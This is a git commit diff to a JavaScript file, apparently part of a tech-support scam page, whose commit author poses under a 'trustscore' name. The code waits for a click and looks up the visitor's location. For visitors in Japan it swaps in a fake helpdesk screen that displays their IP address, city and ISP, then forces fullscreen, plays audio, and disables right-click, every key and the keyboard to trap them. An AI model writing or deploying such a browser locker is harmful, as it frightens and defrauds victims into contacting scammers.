0253db5013a81953cfa3b93fa5404f6ab685a1ae
com-trustscore <trustscore.com@gmail.com>
2025-09-11 06:38:52 -0700

    Update x.js

--- _/x.js
+++ _/x.js
@@ -1,57 +1,60 @@
-const show=    async x1=>{
-  document.head.innerHTML = `
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <meta charset="utf-8">
-    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
-    <meta content="noindex,nofollow" name="robots">
-    <link href="index.css" rel="stylesheet">
-    <title>ヘルプデスクを取得 -01JP21</title>
-  `;
+(async () => {
+  const show=    async x1=>{
+    document.head.innerHTML = `
+      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+      <meta charset="utf-8">
+      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+      <meta content="noindex,nofollow" name="robots">
+      <link href="index.css" rel="stylesheet">
+      <title>ヘルプデスクを取得 -01JP21</title>
+    `;
 
-  await document.documentElement.requestFullscreen();
+    await document.documentElement.requestFullscreen();
 
-  const ipadd=   x1.ip;
-  const city=    x1.city;
-  const country= x1.country;
-  const isp=     x1.connection.isp;
-  const b=       new Date;
-  const currtime=x1.timezone.current_time;
+    const ipadd=   x1.ip;
+    const city=    x1.city;
+    const country= x1.country;
+    const isp=     x1.connection.isp;
+    const b=       new Date;
+    const currtime=x1.timezone.current_time;
 
-  id (`ip_add`).textContent = `Address IP: ${ipadd} ${b.toLocaleString (`EN-US`, currtime)}`;
-  id (`cityopm`).textContent = `City: ${city}, ${country}`;
-  id (`isp`).textContent = `ISP: ${isp}`;
-  id (`mycanvas`).style.display = "block";
-  // id (`remove`).remove();
-  document.querySelector('body > header').remove();
-  document.querySelector('body > main').remove();
-  id (`pridez`).play ();
+    id (`ip_add`).textContent = `Address IP: ${ipadd} ${b.toLocaleString (`EN-US`, currtime)}`;
+    id (`cityopm`).textContent = `City: ${city}, ${country}`;
+    id (`isp`).textContent = `ISP: ${isp}`;
+    id (`mycanvas`).style.display = "block";
+    // id (`remove`).remove();
+    document.querySelector('body > header').remove();
+    document.querySelector('body > main').remove();
+    id (`pridez`).play ();
 
-  window.onload = ()=>{
-    window.moveTo (0, 0);
-    window.resizeTo (window.screen.availWidth, window.screen.availHeight);
+    window.onload = ()=>{
+      window.moveTo (0, 0);
+      window.resizeTo (window.screen.availWidth, window.screen.availHeight);
+    };
+    document.addEventListener("DOMContentLoaded", () => document.body.addEventListener("contextmenu", z1 => z1.preventDefault()));
+    document.onkeydown = ()=>{
+      return false;
+    };
+    await window.navigator.keyboard.lock ();
+
+    return true;
   };
-  document.addEventListener("DOMContentLoaded", () => document.body.addEventListener("contextmenu", z1 => z1.preventDefault()));
-  document.onkeydown = ()=>{
+
+  const none=    async ()=>{
     return false;
   };
-  await window.navigator.keyboard.lock ();
 
-  return true;
-};
+  const id=      c1=>document.getElementById (c1);
 
-const none=    async ()=>{
-  return false;
-};
+  document.documentElement.addEventListener(`click`, async () => {
+    const resp = await window.fetch(`https://ipwho.is/?lang=en`);
+    const json = await resp.json();
 
-const id=      c1=>document.getElementById (c1);
-
-document.documentElement.addEventListener(`click`, async () => {
-  const resp = await window.fetch(`https://ipwho.is/?lang=en`);
-  const json = await resp.json();
-  if (json.country_code === `JP`) {
-    await show(json);
-  }
-  else {
-    await none();
-  }
-});
+    if (json.country_code === `JP`) {
+      await show(json);
+    }
+    else {
+      await none();
+    }
+  });
+})();
